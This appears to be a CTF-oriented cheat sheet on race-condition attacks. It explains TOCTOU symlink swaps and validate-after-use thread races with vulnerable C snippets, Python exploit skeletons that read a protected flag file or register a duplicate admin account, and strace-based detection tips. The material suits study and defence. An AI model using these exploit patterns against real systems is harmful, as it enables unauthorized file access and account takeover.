# Race Condition

Race conditions happen when the window between a **check** and **use** of a resource is wide enough for an attacker to change the resource's state.

## TOCTOU (Time-of-Check Time-of-Use)

**When:** A program checks a condition then later acts on the same resource with a delay between them.

```
Normal execution:
  Time --->
  [check] ---- gap ---- [use]

Race exploit:
  Thread A:  [check] ---- gap ---- [use]
  Thread B:               [swap resource here]
                           ^ When swap lands here, use() operates on swapped resource
```

### Symlink swap

```c
lstat(path, &st);                       // CHECK: is it a regular file?
if (!S_ISREG(st.st_mode)) return;
usleep(200000);                         // WINDOW: 200ms
int fd = open(path, O_RDONLY);          // USE: open() follows symlinks!
```

**One thread** constantly toggles the path between a regular file (passes `lstat` check) and a symlink to the admin secret file. **Another thread** sends LOGIN continuously until the race window lines up.

```python
import threading

def flip():
    while True:
        fix()     # write legitimate state (regular file)
        link()    # replace with symlink to target

def trigger():
    while True:
        io = start()
        io.sendline(b"LOGIN")
        if b"flag" in io.recv(timeout=0.5):
            print(io.recvall())
            return

t1 = threading.Thread(target=flip, daemon=True)
t2 = threading.Thread(target=trigger, daemon=True)
t1.start(); t2.start(); t1.join()
```

## Thread Race (Validate-After-Use)

**When:** Validation runs asynchronously in a separate thread, but the resource is added to the active list before validation completes.

```
Time --->
Main thread:      [add resource] ------------ [use resource]
Validator thread:               [validate...] (slow)
                               ^ Resource is usable while validator is still running
```

### Duplicate account

```c
pthread_create(thread, NULL, verifyNoDuplicatesExist, info);
accounts[numAccounts] = newAccount;  // added to list before validation
numAccounts++;
```

**Exploit:** Create accounts with huge usernames (4MB) to slow down the validator's string comparison. While validators are stalled, create a duplicate `admin` account.

```python
for i in range(10):
    create(username=' ' * 4194303, password='lmao')  # huge = slow compare
create(username='admin', password='')                  # slips past validators
login('admin', '')
```

## Detection

```bash
# Trace syscalls - look for check-then-use on same path
strace -f -e trace=openat,read,write,ioctl ./chall
```

Patterns to look for:

- `lstat` then `open` on the same path (symlink race)
- `access` then `open` on the same path
- File operations after `sleep`/`usleep` (likely TOCTOU window)
- `pthread_create` before validation completes
